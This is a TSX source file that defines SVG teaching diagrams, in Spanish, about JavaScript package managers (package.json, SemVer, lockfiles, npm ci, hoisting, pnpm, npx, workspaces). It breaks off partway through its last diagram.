import { DiagramRegistry } from "../diagram.types";

/** Diagramas SVG del módulo Package Managers. */
export const packageManagersDiagrams: DiagramRegistry = {
  "pkg-package-json-anatomy": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Anatomía de package.json: Manifiesto y Resolución de Módulos</text>

      {/* Left: Metadata & Engines */}
      <rect x="25" y="50" width="180" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="115" y="68" fill="#818cf8" fontWeight="bold" fontSize="10" textAnchor="middle">1. Metadatos &amp; Motores</text>
      <text x="35" y="88" fill={textColor} fontSize="7.5">&quot;name&quot;: &quot;@acme/core-ui&quot;</text>
      <text x="35" y="103" fill={textColor} fontSize="7.5">&quot;version&quot;: &quot;2.4.0&quot;</text>
      <text x="35" y="118" fill="#10b981" fontSize="7.5" fontWeight="bold">&quot;type&quot;: &quot;module&quot; (ESM Nativo)</text>
      <text x="35" y="133" fill={textColor} fontSize="7.5">&quot;engines&quot;: &#123;</text>
      <text x="45" y="146" fill={subtextColor} fontSize="7">&quot;node&quot;: &quot;&gt;=20.0.0&quot;,</text>
      <text x="45" y="158" fill={subtextColor} fontSize="7">&quot;pnpm&quot;: &quot;&gt;=9.0.0&quot;</text>
      <text x="35" y="171" fill={textColor} fontSize="7.5">&#125;</text>

      {/* Center: Scripts & Workflows */}
      <rect x="220" y="50" width="190" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="315" y="68" fill="#34d399" fontWeight="bold" fontSize="10" textAnchor="middle">2. Lifecycle Scripts</text>
      <text x="230" y="88" fill={textColor} fontSize="7.5">&quot;scripts&quot;: &#123;</text>
      <text x="240" y="103" fill="#38bdf8" fontSize="7">&quot;dev&quot;: &quot;vite&quot;,</text>
      <text x="240" y="118" fill="#38bdf8" fontSize="7">&quot;build&quot;: &quot;tsc &amp;&amp; vite build&quot;,</text>
      <text x="240" y="133" fill="#38bdf8" fontSize="7">&quot;test&quot;: &quot;vitest run&quot;,</text>
      <text x="240" y="148" fill="#f59e0b" fontSize="7">&quot;prepare&quot;: &quot;husky&quot;</text>
      <text x="230" y="163" fill={textColor} fontSize="7.5">&#125;</text>
      <text x="315" y="177" fill="#10b981" fontSize="7" fontWeight="bold" textAnchor="middle">Ejecutables vía pnpm run</text>

      {/* Right: Dependencies & Exports */}
      <rect x="425" y="50" width="190" height="135" rx="8" fill={isDark ? "#451a03" : "#fff7ed"} stroke="#f97316" strokeWidth="1.5" />
      <text x="520" y="68" fill="#fb923c" fontWeight="bold" fontSize="10" textAnchor="middle">3. Dependencias &amp; Exports</text>
      <text x="435" y="88" fill={textColor} fontSize="7.5">&quot;dependencies&quot;: &#123;</text>
      <text x="445" y="101" fill={subtextColor} fontSize="7">&quot;react&quot;: &quot;^18.3.1&quot;</text>
      <text x="435" y="114" fill={textColor} fontSize="7.5">&#125;,</text>
      <text x="435" y="127" fill={textColor} fontSize="7.5">&quot;devDependencies&quot;: &#123;</text>
      <text x="445" y="140" fill={subtextColor} fontSize="7">&quot;typescript&quot;: &quot;^5.4.0&quot;</text>
      <text x="435" y="153" fill={textColor} fontSize="7.5">&#125;,</text>
      <text x="435" y="168" fill="#10b981" fontSize="7" fontWeight="bold">&quot;exports&quot;: &quot;./dist/index.js&quot;</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">El campo &apos;type: module&apos; habilita import/export nativo ESM; &apos;exports&apos; controla el punto de entrada moderno.</text>
    </svg>
  );
  },

  "pkg-managers-comparison-matrix": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Comparativa Arquitectónica: NPM vs PNPM vs Yarn vs Bun</text>

      {/* NPM */}
      <rect x="25" y="50" width="135" height="135" rx="8" fill={isDark ? "#450a0a" : "#fee2e2"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="92" y="70" fill="#ef4444" fontWeight="bold" fontSize="11" textAnchor="middle">NPM (Default)</text>
      <text x="35" y="90" fill={textColor} fontSize="7.5">• Incluido con Node.js</text>
      <text x="35" y="105" fill={textColor} fontSize="7.5">• Hoisting plano</text>
      <text x="35" y="120" fill={textColor} fontSize="7.5">• Duplica archivos en disco</text>
      <text x="35" y="135" fill={textColor} fontSize="7.5">• Phantom dependencies</text>
      <text x="92" y="168" fill="#ef4444" fontSize="7" fontWeight="bold" textAnchor="middle">Estándar Universal</text>

      {/* PNPM */}
      <rect x="175" y="50" width="140" height="135" rx="8" fill={isDark ? "#451a03" : "#fff7ed"} stroke="#f97316" strokeWidth="2" />
      <text x="245" y="70" fill="#fb923c" fontWeight="bold" fontSize="11" textAnchor="middle">PNPM (Élite Disc)</text>
      <text x="185" y="90" fill={textColor} fontSize="7.5">• Content-addressable store</text>
      <text x="185" y="105" fill={textColor} fontSize="7.5">• Hard links + Symlinks</text>
      <text x="185" y="120" fill="#10b981" fontSize="7.5" fontWeight="bold">• 0 Phantom Dependencies</text>
      <text x="185" y="135" fill={textColor} fontSize="7.5">• Ahorra 70% disco</text>
      <text x="245" y="168" fill="#f97316" fontSize="7.5" fontWeight="bold" textAnchor="middle">★ Recomendado</text>

      {/* Yarn */}
      <rect x="330" y="50" width="135" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="397" y="70" fill="#818cf8" fontWeight="bold" fontSize="11" textAnchor="middle">Yarn (Berry)</text>
      <text x="340" y="90" fill={textColor} fontSize="7.5">• Creado por Meta</text>
      <text x="340" y="105" fill={textColor} fontSize="7.5">• Plug&apos;n&apos;Play (PnP)</text>
      <text x="340" y="120" fill={textColor} fontSize="7.5">• Zero-installs vía .zip</text>
      <text x="340" y="135" fill={textColor} fontSize="7.5">• Workspaces maduros</text>
      <text x="397" y="168" fill="#6366f1" fontSize="7" fontWeight="bold" textAnchor="middle">Foco en Monorepos</text>

      {/* Bun */}
      <rect x="480" y="50" width="135" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="547" y="70" fill="#34d399" fontWeight="bold" fontSize="11" textAnchor="middle">Bun (Ultra Fast)</text>
      <text x="490" y="90" fill={textColor} fontSize="7.5">• Escrito en Zig</text>
      <text x="490" y="105" fill={textColor} fontSize="7.5">• Installs binarios C++</text>
      <text x="490" y="120" fill={textColor} fontSize="7.5">• 20x más rápido que npm</text>
      <text x="490" y="135" fill={textColor} fontSize="7.5">• Runtime + Bundler + PM</text>
      <text x="547" y="168" fill="#10b981" fontSize="7" fontWeight="bold" textAnchor="middle">Velocidad Extrema</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">PNPM es el estándar de facto en monorepos empresariales por su estricto aislamiento y ahorro masivo de disco.</text>
    </svg>
  );
  },

  "pkg-dependencies-types-venn": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Tipos de Dependencias y su Rol en el Ciclo de Vida</text>

      {/* dependencies */}
      <rect x="25" y="50" width="135" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="92" y="70" fill="#34d399" fontWeight="bold" fontSize="10" textAnchor="middle">dependencies</text>
      <text x="35" y="90" fill={textColor} fontSize="7.5">• Runtime de Producción</text>
      <text x="35" y="105" fill={textColor} fontSize="7.5">• Se empaquetan en el bundle</text>
      <text x="35" y="120" fill={textColor} fontSize="7.5">• Ej: react, zustand, axios</text>
      <text x="35" y="135" fill={subtextColor} fontSize="7">• npm i &lt;pkg&gt;</text>
      <text x="92" y="168" fill="#10b981" fontSize="7" fontWeight="bold" textAnchor="middle">Crítico en Producción</text>

      {/* devDependencies */}
      <rect x="175" y="50" width="135" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="242" y="70" fill="#818cf8" fontWeight="bold" fontSize="10" textAnchor="middle">devDependencies</text>
      <text x="185" y="90" fill={textColor} fontSize="7.5">• Compilación &amp; Testing</text>
      <text x="185" y="105" fill={textColor} fontSize="7.5">• Excluido en --omit=dev</text>
      <text x="185" y="120" fill={textColor} fontSize="7.5">• Ej: vite, typescript, jest</text>
      <text x="185" y="135" fill={subtextColor} fontSize="7">• npm i -D &lt;pkg&gt;</text>
      <text x="242" y="168" fill="#6366f1" fontSize="7" fontWeight="bold" textAnchor="middle">Solo para Desarrollo</text>

      {/* peerDependencies */}
      <rect x="325" y="50" width="140" height="135" rx="8" fill={isDark ? "#451a03" : "#fff7ed"} stroke="#f97316" strokeWidth="1.5" />
      <text x="395" y="70" fill="#fb923c" fontWeight="bold" fontSize="10" textAnchor="middle">peerDependencies</text>
      <text x="335" y="90" fill={textColor} fontSize="7.5">• Contrato con el host</text>
      <text x="335" y="105" fill={textColor} fontSize="7.5">• El consumidor la provee</text>
      <text x="335" y="120" fill={textColor} fontSize="7.5">• Evita instancias duplicadas</text>
      <text x="335" y="135" fill={textColor} fontSize="7.5">• Ej: react en UI library</text>
      <text x="395" y="168" fill="#f97316" fontSize="7" fontWeight="bold" textAnchor="middle">Regla de Plugins / Libs</text>

      {/* optional & bundled */}
      <rect x="480" y="50" width="135" height="135" rx="8" fill={isDark ? "#3b0764" : "#faf5ff"} stroke="#a855f7" strokeWidth="1.5" />
      <text x="547" y="70" fill="#c084fc" fontWeight="bold" fontSize="9.5" textAnchor="middle">optional / bundled</text>
      <text x="490" y="90" fill={textColor} fontSize="7.5">• optionalDependencies:</text>
      <text x="490" y="103" fill={subtextColor} fontSize="6.5">  Binarios nativos por OS</text>
      <text x="490" y="113" fill={subtextColor} fontSize="6.5">  (fsevents en macOS)</text>
      <text x="490" y="130" fill={textColor} fontSize="7.5">• bundledDependencies:</text>
      <text x="490" y="143" fill={subtextColor} fontSize="6.5">  Empaquetadas en tarball</text>
      <text x="547" y="168" fill="#a855f7" fontSize="7" fontWeight="bold" textAnchor="middle">Casos de Especialidad</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">En bibliotecas públicas (UI kits), React debe declararse en peerDependencies para no duplicar el contexto del Virtual DOM.</text>
    </svg>
  );
  },

  "pkg-semver-ranges-caret-tilde": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Operadores SemVer: Caret (^), Tilde (~) y Fijación Exacta</text>

      {/* Caret ^ */}
      <rect x="25" y="50" width="185" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="117" y="70" fill="#818cf8" fontWeight="bold" fontSize="11" textAnchor="middle">Caret ^ (Comportamiento por defecto)</text>
      <rect x="35" y="80" width="165" height="24" rx="4" fill="#6366f1" />
      <text x="117" y="96" fill="#ffffff" fontWeight="bold" fontSize="9" fontFamily="monospace" textAnchor="middle">^1.2.3 ➔ [1.2.3, 2.0.0)</text>
      <text x="35" y="120" fill={textColor} fontSize="7.5">• Bloquea MAJOR en 1</text>
      <text x="35" y="135" fill={textColor} fontSize="7.5">• Permite MINOR y PATCH</text>
      <text x="35" y="150" fill={textColor} fontSize="7.5">• Se actualiza hasta 1.9.9</text>
      <text x="117" y="172" fill="#818cf8" fontSize="7" fontWeight="bold" textAnchor="middle">Default en npm install</text>

      {/* Tilde ~ */}
      <rect x="228" y="50" width="185" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="320" y="70" fill="#34d399" fontWeight="bold" fontSize="11" textAnchor="middle">Tilde ~ (Conservador)</text>
      <rect x="238" y="80" width="165" height="24" rx="4" fill="#10b981" />
      <text x="320" y="96" fill="#ffffff" fontWeight="bold" fontSize="9" fontFamily="monospace" textAnchor="middle">~1.2.3 ➔ [1.2.3, 1.3.0)</text>
      <text x="238" y="120" fill={textColor} fontSize="7.5">• Bloquea MAJOR y MINOR</text>
      <text x="238" y="135" fill={textColor} fontSize="7.5">• Solo permite PATCH (bugfixes)</text>
      <text x="238" y="150" fill={textColor} fontSize="7.5">• Se actualiza hasta 1.2.9</text>
      <text x="320" y="172" fill="#10b981" fontSize="7" fontWeight="bold" textAnchor="middle">Alta Estabilidad</text>

      {/* Exact & Wildcard */}
      <rect x="430" y="50" width="185" height="135" rx="8" fill={isDark ? "#450a0a" : "#fee2e2"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="522" y="70" fill="#ef4444" fontWeight="bold" fontSize="11" textAnchor="middle">Versión Exacta vs Wildcard</text>
      <rect x="440" y="80" width="165" height="24" rx="4" fill={isDark ? "#7f1d1d" : "#fecaca"} />
      <text x="522" y="96" fill="#ef4444" fontWeight="bold" fontSize="9" fontFamily="monospace" textAnchor="middle">1.2.3 (Pinning Exacto)</text>
      <text x="440" y="120" fill={textColor} fontSize="7.5">• Sin símbolos: versión 100% fija</text>
      <text x="440" y="135" fill="#ef4444" fontSize="7.5" fontWeight="bold">• &quot;*&quot; o &quot;latest&quot;: PELIGRO CRÍTICO</text>
      <text x="440" y="148" fill={subtextColor} fontSize="6.5">  Descarga breaking changes sorpresa</text>
      <text x="522" y="172" fill="#ef4444" fontSize="7" fontWeight="bold" textAnchor="middle">Pinning en apps de misión crítica</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Nota especial: Con versiones 0.x.x (^0.2.3), el caret bloquea el 2, pues en pre-release el 0 no garantiza estabilidad.</text>
    </svg>
  );
  },

  "pkg-lockfile-integrity-hash": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">El Lockfile: Determinismo Criptográfico y SRI (Subresource Integrity)</text>

      {/* Lockfile Entry Block */}
      <rect x="30" y="50" width="340" height="135" rx="8" fill={isDark ? "#0f172a" : "#1e293b"} />
      <text x="45" y="70" fill="#94a3b8" fontSize="7.5" fontFamily="monospace">&quot;node_modules/axios&quot;: &#123;</text>
      <text x="55" y="85" fill="#38bdf8" fontSize="7.5" fontFamily="monospace">&quot;version&quot;: &quot;1.7.2&quot;,</text>
      <text x="55" y="100" fill="#a5b4fc" fontSize="7" fontFamily="monospace">&quot;resolved&quot;: &quot;https://registry.npmjs.org/axios/-/axios-1.7.2.tgz&quot;,</text>
      <text x="55" y="118" fill="#34d399" fontSize="7" fontFamily="monospace">&quot;integrity&quot;: &quot;sha512-huDJ...==&quot;,</text>
      <text x="55" y="133" fill="#f59e0b" fontSize="7" fontFamily="monospace">&quot;dependencies&quot;: &#123;</text>
      <text x="65" y="146" fill="#f59e0b" fontSize="7" fontFamily="monospace">&quot;follow-redirects&quot;: &quot;^1.15.6&quot;</text>
      <text x="55" y="159" fill="#f59e0b" fontSize="7" fontFamily="monospace">&#125;</text>
      <text x="45" y="174" fill="#94a3b8" fontSize="7.5" fontFamily="monospace">&#125;</text>

      {/* Right: Security & Determinism */}
      <rect x="390" y="50" width="220" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="500" y="70" fill="#34d399" fontWeight="bold" fontSize="10" textAnchor="middle">Garantías del Lockfile</text>
      <text x="405" y="92" fill={textColor} fontSize="7.5">1. <tspan fontWeight="bold">Determinismo 100%:</tspan></text>
      <text x="405" y="105" fill={subtextColor} fontSize="7">  Misma versión exacta en tu laptop,</text>
      <text x="405" y="117" fill={subtextColor} fontSize="7">  en el CI y en producción.</text>
      <text x="405" y="135" fill="#10b981" fontSize="7.5" fontWeight="bold">2. Integridad Criptográfica:</text>
      <text x="405" y="148" fill={subtextColor} fontSize="7">  El hash sha512 evita ataques de</text>
      <text x="405" y="160" fill={subtextColor} fontSize="7">  Man-in-the-Middle o paquetes corruptos.</text>
      <text x="500" y="177" fill="#ef4444" fontSize="7" fontWeight="bold" textAnchor="middle">¡NUNCA lo añadas al .gitignore!</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">El lockfile (package-lock.json, pnpm-lock.yaml) DEBE commitearse obligatoriamente en el control de versiones.</text>
    </svg>
  );
  },

  "pkg-npm-install-vs-npm-ci": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Instalación Local vs CI/CD: npm install vs npm ci (--frozen-lockfile)</text>

      {/* npm install */}
      <rect x="25" y="48" width="280" height="140" rx="8" fill={isDark ? "#450a0a" : "#fee2e2"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="165" y="68" fill="#ef4444" fontWeight="bold" fontSize="11" textAnchor="middle">npm install (Entorno Local Dev)</text>
      <text x="35" y="90" fill={textColor} fontSize="7.5">• Puede modificar el lockfile si hay desajustes</text>
      <text x="35" y="105" fill={textColor} fontSize="7.5">• Calcula árboles de dependencias dinámicamente</text>
      <text x="35" y="120" fill={textColor} fontSize="7.5">• No borra node_modules existente (acumula residuos)</text>
      <text x="35" y="135" fill={textColor} fontSize="7.5">• Más lento en pipelines automatizados</text>
      <text x="165" y="172" fill="#ef4444" fontSize="7.5" fontWeight="bold" textAnchor="middle">❌ Antipatrón en pipelines de CI/CD</text>

      {/* npm ci */}
      <rect x="335" y="48" width="280" height="140" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="475" y="68" fill="#34d399" fontWeight="bold" fontSize="11" textAnchor="middle">npm ci / pnpm install --frozen-lockfile</text>
      <text x="345" y="90" fill={textColor} fontSize="7.5">• 100% estricto: Si el lockfile no coincide, ABORTA</text>
      <text x="345" y="105" fill={textColor} fontSize="7.5">• Borra node_modules completo previo (Clean Install)</text>
      <text x="345" y="120" fill={textColor} fontSize="7.5">• No escribe nunca en el lockfile (inmutable)</text>
      <text x="345" y="135" fill={textColor} fontSize="7.5">• Entre 2x y 5x más rápido (salta resolución)</text>
      <text x="475" y="172" fill="#10b981" fontSize="7.5" fontWeight="bold" textAnchor="middle">✅ Estándar obligatorio en GitHub Actions / CI</text>

      <rect x="25" y="195" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="205" fill={subtextColor} fontSize="7.5" textAnchor="middle">En PNPM se utiliza &apos;pnpm install --frozen-lockfile&apos; para garantizar que el pipeline falle si el lockfile está desincronizado.</text>
    </svg>
  );
  },

  "pkg-hoisting-flat-vs-nested": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Evolución de node_modules: Árbol Anidado vs Hoisting Plano</text>

      {/* Nested */}
      <rect x="25" y="50" width="280" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="165" y="68" fill="#818cf8" fontWeight="bold" fontSize="10" textAnchor="middle">Árbol Anidado (NPM v2 - Pasado)</text>
      <text x="40" y="90" fill={textColor} fontSize="7.5">node_modules/</text>
      <text x="55" y="103" fill={textColor} fontSize="7">└── packageA/</text>
      <text x="70" y="116" fill={subtextColor} fontSize="7">    └── node_modules/</text>
      <text x="85" y="129" fill={subtextColor} fontSize="7">        └── packageB/</text>
      <text x="100" y="142" fill="#ef4444" fontSize="7">            └── node_modules/ ... (infinito)</text>
      <text x="40" y="165" fill="#ef4444" fontSize="7" fontWeight="bold">Error Windows MAX_PATH (260 chars) y duplicación masiva</text>

      {/* Flat Hoisting */}
      <rect x="335" y="50" width="280" height="135" rx="8" fill={isDark ? "#451a03" : "#fff7ed"} stroke="#f97316" strokeWidth="1.5" />
      <text x="475" y="68" fill="#fb923c" fontWeight="bold" fontSize="10" textAnchor="middle">Hoisting Plano (NPM v3+, Yarn v1)</text>
      <text x="350" y="90" fill={textColor} fontSize="7.5">node_modules/ (Todo elevado a la raíz)</text>
      <text x="365" y="103" fill="#10b981" fontSize="7">├── packageA</text>
      <text x="365" y="116" fill="#10b981" fontSize="7">├── packageB (Elevado al root)</text>
      <text x="365" y="129" fill="#10b981" fontSize="7">└── packageC</text>
      <text x="350" y="150" fill={textColor} fontSize="7.5">• Resuelve rutas largas en disco</text>
      <text x="350" y="165" fill="#f97316" fontSize="7" fontWeight="bold">⚠️ Provoca el problema de &quot;Phantom Dependencies&quot;</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">El aplanamiento solucionó las rutas largas pero creó accesos ilegítimos a paquetes no declarados.</text>
    </svg>
  );
  },

  "pkg-phantom-dependencies-pnpm": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Phantom Dependencies &amp; La Estructura Estricta de PNPM</text>

      {/* Phantom Dependency Bug */}
      <rect x="25" y="48" width="280" height="140" rx="8" fill={isDark ? "#450a0a" : "#fee2e2"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="165" y="66" fill="#ef4444" fontWeight="bold" fontSize="10" textAnchor="middle">El Bug de la Dependencia Fantasma (NPM/Yarn)</text>
      <text x="35" y="86" fill={textColor} fontSize="7.5">1. Declaras solo &apos;express&apos; en package.json</text>
      <text x="35" y="100" fill={textColor} fontSize="7.5">2. &apos;express&apos; depende de &apos;debug&apos;</text>
      <text x="35" y="114" fill={textColor} fontSize="7.5">3. El hoisting coloca &apos;debug&apos; en /node_modules/</text>
      <rect x="35" y="125" width="260" height="22" rx="3" fill={isDark ? "#7f1d1d" : "#fecaca"} />
      <text x="42" y="140" fill="#f87171" fontSize="7" fontFamily="monospace">import debug from &apos;debug&apos;; // ¡Funciona local!</text>
      <text x="35" y="165" fill="#ef4444" fontSize="7" fontWeight="bold">Falla en CI si express cambia su subdependencia</text>

      {/* PNPM Strict Symlinks */}
      <rect x="335" y="48" width="280" height="140" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="475" y="66" fill="#34d399" fontWeight="bold" fontSize="10" textAnchor="middle">Aislamiento Estricto con PNPM (Hard Links + Symlinks)</text>
      <text x="345" y="86" fill={textColor} fontSize="7.5">• Content-Addressable Store global (.pnpm-store)</text>
      <text x="345" y="100" fill={textColor} fontSize="7.5">• En root node_modules/ SOLO están las dependencias</text>
      <text x="345" y="112" fill={textColor} fontSize="7.5">  declaradas explícitamente en tu package.json</text>
      <rect x="345" y="125" width="260" height="22" rx="3" fill={isDark ? "#065f46" : "#a7f3d0"} />
      <text x="352" y="140" fill="#064e3b" fontSize="7" fontFamily="monospace">import debug from &apos;debug&apos;; ➔ MODULE_NOT_FOUND</text>
      <text x="475" y="172" fill="#10b981" fontSize="7.5" fontWeight="bold" textAnchor="middle">Garantiza builds 100% reproducibles</text>

      <rect x="25" y="195" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="205" fill={subtextColor} fontSize="7.5" textAnchor="middle">PNPM te protege obligándote a declarar cualquier librería que importes en tu código.</text>
    </svg>
  );
  },

  "pkg-npx-ephemeral-execution": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Ciclo de Vida de npx: Ejecución Efímera sin Polución Global</text>

      {/* Step 1 */}
      <rect x="25" y="55" width="165" height="115" rx="8" fill={isDark ? "#1e1b4b" : "#eef2ff"} stroke="#6366f1" strokeWidth="1.5" />
      <text x="107" y="75" fill="#818cf8" fontWeight="bold" fontSize="9.5" textAnchor="middle">1. Búsqueda Local</text>
      <text x="35" y="95" fill={textColor} fontSize="7.5">• Revisa ./node_modules/.bin/</text>
      <text x="35" y="110" fill={textColor} fontSize="7.5">• Ejecuta binario local del repo</text>
      <text x="35" y="125" fill={subtextColor} fontSize="7">• Sin descargas de red</text>
      <text x="107" y="152" fill="#6366f1" fontSize="7" fontWeight="bold" textAnchor="middle">Prioridad a versión local</text>

      {/* Arrow 1 */}
      <path d="M198 112 L228 112" stroke="#6366f1" strokeWidth="2" />
      <polygon points="230,112 223,108 223,116" fill="#6366f1" />

      {/* Step 2 */}
      <rect x="235" y="55" width="170" height="115" rx="8" fill={isDark ? "#451a03" : "#fff7ed"} stroke="#f97316" strokeWidth="1.5" />
      <text x="320" y="75" fill="#fb923c" fontWeight="bold" fontSize="9.5" textAnchor="middle">2. Caché Efímera</text>
      <text x="245" y="95" fill={textColor} fontSize="7.5">• Si no existe localmente:</text>
      <text x="245" y="110" fill={textColor} fontSize="7.5">• Descarga a ~/.npm/_npx/</text>
      <text x="245" y="125" fill={textColor} fontSize="7.5">• No toca dependencias globales</text>
      <text x="320" y="152" fill="#f97316" fontSize="7" fontWeight="bold" textAnchor="middle">Cero Polución Global</text>

      {/* Arrow 2 */}
      <path d="M408 112 L438 112" stroke="#10b981" strokeWidth="2" />
      <polygon points="440,112 433,108 433,116" fill="#10b981" />

      {/* Step 3 */}
      <rect x="445" y="55" width="165" height="115" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="527" y="75" fill="#34d399" fontWeight="bold" fontSize="9.5" textAnchor="middle">3. Ejecución &amp; Purga</text>
      <text x="455" y="95" fill={textColor} fontSize="7.5">• Ejecuta el comando CLI</text>
      <text x="455" y="110" fill={textColor} fontSize="7.5">• Pasa argumentos intactos</text>
      <text x="455" y="125" fill={textColor} fontSize="7.5">• Ej: npx knip / npx prisma</text>
      <text x="527" y="152" fill="#10b981" fontSize="7" fontWeight="bold" textAnchor="middle">Siempre versión fresca</text>

      <rect x="25" y="180" width="590" height="25" rx="4" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="196" fill={subtextColor} fontSize="7.5" textAnchor="middle">npx eliminó la necesidad de instalar herramientas como &apos;create-react-app&apos; o &apos;tsc&apos; con &apos;npm i -g&apos; a nivel de sistema operativo.</text>
    </svg>
  );
  },

  "pkg-monorepo-workspaces-linking": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Monorepos &amp; Workspaces: Vinculación Local con workspace:*</text>

      {/* Root package.json */}
